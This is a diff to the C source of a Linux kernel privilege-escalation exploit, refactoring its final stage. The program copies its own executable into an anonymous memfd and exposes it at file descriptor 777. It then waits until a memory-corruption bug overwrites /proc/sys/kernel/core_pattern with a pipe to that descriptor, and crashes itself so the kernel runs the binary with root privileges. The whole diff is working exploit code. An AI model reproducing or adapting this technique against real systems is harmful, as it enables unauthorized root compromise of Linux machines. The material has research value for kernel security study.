@@ -49,7 +49,8 @@
 #define MMAP_SZ				(PAGE_SIZE * 2)
 #define PAYLOAD_SZ			95
 
-static const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";
+static const char fake_core_pattern[] = "|/proc/%P/fd/777 %P";
+#define CHECK_SZ 256
 
 /* ============================== Kernel stuff ============================== */
 
@@ -200,53 +201,106 @@ int act(int act_fd, int code, int n, char *args)
 	return EXIT_SUCCESS;
 }
 
-int check_core()
+int wait_new_core_pattern(int fd)
 {
-	/* check if /proc/sys/kernel/core_pattern has been overwritten */
-	char buf[0x100] = {};
-	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
-	if (core < 0) {
-		perror("[-] open");
-		return EXIT_FAILURE;
-	}
-	read(core, buf, sizeof(buf));
-	close(core);
-	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
-}
+	char buf[CHECK_SZ] = { 0 };
+	size_t len = strlen(fake_core_pattern); /* don't check the last symbol */
+	ssize_t bytes = -1;
+	int ret = -1;
 
-void crash(char *cmd)
-{
-	int memfd = memfd_create("", 0);
-	if (memfd < 0) {
-		perror("[-] memfd_create");
-		return;
-	}
-	if (sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff) < 0) {
-		perror("[-] sendfile");
-		close(memfd);
-		return;
-	}
-	dup2(memfd, 666);
-	close(memfd);
-	while (check_core() == 0)
+	while (1) {
+		bytes = read(fd, buf, CHECK_SZ);
+		if (bytes < 0) {
+			perror("[-] read core_pattern");
+			return EXIT_FAILURE;
+		}
+
+		if (strncmp(fake_core_pattern, buf, len) == 0)
+			return EXIT_SUCCESS;
+
+		ret = lseek(fd, 0, SEEK_SET);
+		if (ret < 0) {
+			perror("[-] lseek core_pattern");
+			return EXIT_FAILURE;
+		}
+
 		sleep(1);
-	/*
-	 * Trigger program crash and cause kernel to executes program from
-	 * `core_pattern` which is our "root" binary
-	 */
-	*(size_t *)0 = 0;
+	}
 }
 
-void wait_and_trigger_core_pattern(void)
+void wait_and_trigger_core_dump(void)
 {
 	int ret = EXIT_FAILURE;
+	int core_pattern_fd = -1;
+	int memfd = -1;
+	int self_fd = -1;
 
 	ret = do_cpu_pinning(1);
 	if (ret == EXIT_FAILURE)
 		return;
 
-	setsid();
-	crash("");
+	core_pattern_fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
+	if (core_pattern_fd < 0) {
+		perror("[-] open core_pattern");
+		goto err;
+	}
+
+	/* Create an anonymous file and copy the code of this program into it */
+	memfd = memfd_create("", 0);
+	if (memfd < 0) {
+		perror("[-] memfd_create");
+		goto err;
+	}
+
+	self_fd = open("/proc/self/exe", O_RDONLY);
+	if (self_fd < 0) {
+		perror("[-] open exe");
+		goto err;
+	}
+
+	ret = sendfile(memfd, self_fd, 0, 0xffffffff);
+	if (ret < 0) {
+		perror("[-] sendfile");
+		goto err;
+	}
+
+	/* Make this binary available at the file descriptor 777 */
+	ret = dup2(memfd, 777);
+	if (ret < 0) {
+		perror("[-] dup2");
+		goto err;
+	}
+
+	/* Now wait until the core_pattern is changed via the memory corruption */
+	ret = wait_new_core_pattern(core_pattern_fd);
+	if (ret == EXIT_FAILURE)
+		goto err;
+
+	/*
+	 * Trigger a program crash and provoke creating a core dump. The corrupted
+	 * core_pattern makes the kernel run this binary with root privileges.
+	 */
+	printf("[+] core_pattern is changed, create a core dump\n");
+	*(char *)0 = 0;
+
+err:
+	if (core_pattern_fd >= 0) {
+		ret = close(core_pattern_fd);
+		if (ret != 0)
+			perror("[-] close core_pattern_fd");
+	}
+
+	if (memfd >= 0) {
+		ret = close(memfd);
+		if (ret != 0)
+			perror("[-] close memfd");
+	}
+
+	if (self_fd >= 0) {
+		ret = close(self_fd);
+		if (ret != 0)
+			perror("[-] close self_fd");
+	}
 }
 
 int main(int argc, char **argv)
@@ -307,7 +361,8 @@ int main(int argc, char **argv)
 	}
 
 	if (pid == 0) {
-		wait_and_trigger_core_pattern(); /* should not return */
+		wait_and_trigger_core_dump(); /* should not return */
+		printf("[-] core_pattern trick failed\n");
 		return EXIT_FAILURE;
 	}
 
